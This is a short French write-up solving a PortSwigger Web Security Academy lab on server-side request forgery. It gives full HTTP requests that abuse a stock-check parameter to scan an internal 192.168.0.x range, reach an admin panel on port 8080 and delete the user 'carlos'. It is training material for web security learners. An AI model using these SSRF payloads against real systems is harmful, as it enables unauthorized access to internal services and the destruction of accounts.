# Lab

https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system

## Solution

On commence par scanner le réseau interne `192.168.0.*` avec la fonctionnalité de check de stock et Burp Intruder.

On envoie la requête suivante :

```http
POST /product/stock HTTP/2
Host: 0af70073047998e88369aa880046008b.web-security-academy.net
Cookie: session=m7xrkEhdZVVHWqRbNWSjJdBDTyyY0Rks
Content-Length: 43
Sec-Ch-Ua: "Not=A?Brand";v="99", "Chromium";v="118"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.70 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0af70073047998e88369aa880046008b.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0af70073047998e88369aa880046008b.web-security-academy.net/product?productId=4
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9

stockApi=http://192.168.0.§1§:8080/&storeId=1
```

Et on voit que sur l'IP `85` on a un `Not Found` contrairement aux autres IP qui renvoient un `500`.

```http
HTTP/2 404 Not Found
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 11

"Not Found"
```

On essaie d'accéder à la page d'administration du serveur local sur l'IP `85` :

```http
POST /product/stock HTTP/2
Host: 0af70073047998e88369aa880046008b.web-security-academy.net
Cookie: session=m7xrkEhdZVVHWqRbNWSjJdBDTyyY0Rks
Content-Length: 49
Sec-Ch-Ua: "Not=A?Brand";v="99", "Chromium";v="118"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.70 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0af70073047998e88369aa880046008b.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0af70073047998e88369aa880046008b.web-security-academy.net/product?productId=4
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9

stockApi=http://192.168.0.85:8080/admin&storeId=1
```

Et on a une réponse avec l'URL `http://192.168.0.85:8080/admin/delete?username=carlos` dedans.

On réutilise la fonctionnalité de check de stock pour supprimer l'utilisateur `carlos` :

```http
POST /product/stock HTTP/2
Host: 0af70073047998e88369aa880046008b.web-security-academy.net
Cookie: session=m7xrkEhdZVVHWqRbNWSjJdBDTyyY0Rks
Content-Length: 72
Sec-Ch-Ua: "Not=A?Brand";v="99", "Chromium";v="118"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.70 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0af70073047998e88369aa880046008b.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0af70073047998e88369aa880046008b.web-security-academy.net/product?productId=4
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9

stockApi=http://192.168.0.85:8080/admin/delete?username=carlos&storeId=1
```